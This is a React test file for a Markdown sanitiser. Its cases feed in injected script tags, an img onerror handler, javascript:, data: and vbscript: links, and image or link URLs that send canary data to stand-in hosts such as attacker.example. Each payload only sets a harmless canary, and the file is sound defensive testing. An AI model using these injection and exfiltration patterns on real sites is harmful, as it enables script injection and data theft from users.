import { render } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { afterEach, describe, expect, it } from "vitest";
import { allowedHref, SafeMarkdown, safeUrlTransform } from "./SafeMarkdown";

// Canaries only (CLAUDE.md): each asks for a harmless marker, never a real payload.
declare global {
  interface Window {
    CANARY_T10?: number;
  }
}

function renderMd(text: string, allowedHosts?: string[]) {
  return render(<SafeMarkdown text={text} allowedHosts={allowedHosts} />).container;
}

afterEach(() => {
  delete window.CANARY_T10;
});

describe("SafeMarkdown (A3, C07)", () => {
  it("T-10: drops raw HTML, so an injected <script> never runs or reaches the DOM", () => {
    const c = renderMd("Good answer.\n\n<script>window.CANARY_T10=1</script>\n\nCANARY-T10-a1b2");
    expect(window.CANARY_T10).toBeUndefined();
    expect(c.querySelector("script")).toBeNull();
    expect(c.textContent).toContain("Good answer.");
    expect(c.textContent).not.toContain("window.CANARY_T10");
  });

  it("T-10: an inline <img onerror> handler never fires", () => {
    const c = renderMd('Score explained <img src=x onerror="window.CANARY_T10=1"> here.');
    expect(window.CANARY_T10).toBeUndefined();
    expect(c.querySelector("img")).toBeNull();
    expect(c.querySelector("[onerror]")).toBeNull();
  });

  it("T-10: a javascript: link renders as plain text and clicking it does nothing", async () => {
    const c = renderMd("[click](javascript:window.CANARY_T10=1)");
    expect(c.querySelector("a")).toBeNull();
    const span = c.querySelector(".link-removed");
    expect(span?.textContent).toBe("click");
    await userEvent.setup().click(span!);
    expect(window.CANARY_T10).toBeUndefined();
  });

  it("T-09: a Markdown image becomes text and creates no <img>, so nothing is requested", () => {
    const c = renderMd("![x](https://canary.example/?d=CANARY-T09-4e2f)");
    expect(c.querySelector("img")).toBeNull();
    expect(c.innerHTML).not.toContain("canary.example");
    expect(c.textContent).toBe("[image removed: x]");
  });

  it("T-09: a reference-style image is removed too", () => {
    const c = renderMd("![pic][r]\n\n[r]: https://canary.example/?d=CANARY-T09-77c1");
    expect(c.querySelector("img")).toBeNull();
    expect(c.innerHTML).not.toContain("canary.example");
  });

  it("T-09: links to other sites render as plain text, not as links", () => {
    const c = renderMd("[see this](https://attacker.example/?d=CANARY-T09-9d0e)");
    expect(c.querySelector("a")).toBeNull();
    expect(c.querySelector(".link-removed")?.textContent).toBe("see this");
  });

  it("blocks data: and vbscript: links", () => {
    const c = renderMd("[a](data:text/html;base64,PGI+aGk8L2I+) [b](vbscript:msgbox)");
    expect(c.querySelector("a")).toBeNull();
  });

  it("keeps links to our own host, with a safe rel and a new tab", () => {
    const c = renderMd(`[rubric](http://${window.location.host}/courses/1)`);
    const a = c.querySelector("a");
    expect(a?.getAttribute("href")).toBe(`http://${window.location.host}/courses/1`);
    expect(a?.getAttribute("rel")).toBe("noopener noreferrer nofollow");
    expect(a?.getAttribute("target")).toBe("_blank");
  });

  it("keeps links to hosts the caller allows", () => {
    const c = renderMd("[docs](https://docs.example/page)", ["docs.example"]);
    expect(c.querySelector("a")?.getAttribute("href")).toBe("https://docs.example/page");
  });

  it("renders ordinary Markdown", () => {
    const c = renderMd("**Strong** and *em*\n\n- one\n- two\n\n`code`\n\n> quote");
    expect(c.querySelector("strong")?.textContent).toBe("Strong");
    expect(c.querySelector("em")?.textContent).toBe("em");
    expect(c.querySelectorAll("li")).toHaveLength(2);
    expect(c.querySelector("code")?.textContent).toBe("code");
    expect(c.querySelector("blockquote")).not.toBeNull();
  });

  it("produces only allow-listed elements and no inline style or event attributes", () => {
    const c = renderMd('# H\n\ntext <b style="color:red" onclick="x()">bold</b> <iframe src="https://x.example"></iframe>');
    const allowed = new Set(["DIV", "P", "H1", "EM", "STRONG", "CODE", "PRE", "BLOCKQUOTE", "UL", "OL", "LI", "BR", "HR", "SPAN", "A"]);
    for (const el of c.querySelectorAll("*")) {
      expect(allowed.has(el.tagName)).toBe(true);
      for (const attr of el.getAttributeNames()) {
        expect(attr === "style" || attr.startsWith("on")).toBe(false);
      }
    }
    expect(c.querySelector("iframe")).toBeNull();
  });
});

describe("URL helpers", () => {
  const hosts = new Set(["rubrica.test"]);

  it("allowedHref accepts only http(s) on an allowed host", () => {
    expect(allowedHref("https://rubrica.test/a", hosts)).toBe("https://rubrica.test/a");
    expect(allowedHref("https://evil.test/a", hosts)).toBeNull();
    expect(allowedHref("javascript:alert(1)", hosts)).toBeNull();
    expect(allowedHref("//evil.test/a", hosts)).toBeNull();
    expect(allowedHref(undefined, hosts)).toBeNull();
  });

  it("safeUrlTransform blanks every non-http(s) URL", () => {
    const node: Parameters<typeof safeUrlTransform>[2] = { type: "element", tagName: "a", properties: {}, children: [] };
    expect(safeUrlTransform("https://x.test/", "href", node)).toBe("https://x.test/");
    expect(safeUrlTransform("/relative", "href", node)).toBe("/relative");
    expect(safeUrlTransform("JaVaScRiPt:alert(1)", "href", node)).toBe("");
    expect(safeUrlTransform("data:text/html,x", "href", node)).toBe("");
  });
});
